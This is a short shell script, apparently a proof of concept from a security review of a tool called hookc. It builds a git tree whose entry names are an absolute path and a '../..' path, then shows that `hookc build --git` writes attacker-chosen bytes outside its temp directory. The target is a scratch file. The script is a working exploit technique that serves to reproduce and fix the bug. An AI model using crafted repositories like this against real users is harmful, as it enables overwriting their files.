#!/bin/sh
# C1: export_git joins raw git tree-entry names onto the temp dir with os.path.join and no containment check.
# A crafted tree (git hash-object --literally) with an ABSOLUTE or '..' entry name makes
# `hookc reproduce --git <their repo>` / `hookc build --git` write attacker bytes anywhere the user can write.
# Target here is a file inside this scratch dir.
set -u
RT=$(cd "$(dirname "$0")" && pwd); HR=$RT/../rt-hookc; W=$RT/work-c1; rm -rf "$W"; mkdir -p "$W/repo"
cd "$W/repo"; git init -q; git config user.email rt@x; git config user.name rt
TARGET="$W/PWNED_abs.txt"
BLOB=$(printf 'attacker-controlled bytes\n' | git hash-object -w --stdin)
HOOK=$(printf '#include "hookapi.h"\nint64_t hook(uint32_t r){_g(1,1);return accept(0,0,0);}\n' | git hash-object -w --stdin)
TREE=$(python3 - "$BLOB" "$HOOK" "$TARGET" <<'PY'
import sys, subprocess
blob, hook, target = sys.argv[1:]
ents = [(target.encode(), blob), (b"../../PWNED_dotdot.txt", blob), (b"hook.c", hook)]
body = b"".join(b"100644 " + n + b"\0" + bytes.fromhex(h) for n, h in sorted(ents))
print(subprocess.run(["git", "hash-object", "-t", "tree", "--literally", "-w", "--stdin"], input=body, capture_output=True).stdout.decode().strip())
PY
)
C=$(git commit-tree "$TREE" -m crafted); echo "crafted commit $C"; git ls-tree -r "$C" | cat -v
"$HR/hookc" build --git "$W/repo" --rev "$C" --toolchain hookc-llvm22 --platform linux/arm64 --out "$W/out" >"$W/build.out" 2>&1; echo "hookc build exit=$?"
tail -2 "$W/build.out"
ls -la "$TARGET" 2>&1; cat "$TARGET" 2>/dev/null
find "$HOME/.cache/hook-repro" -maxdepth 2 -name 'PWNED_dotdot.txt' -print -exec cat {} \; -exec rm {} \;
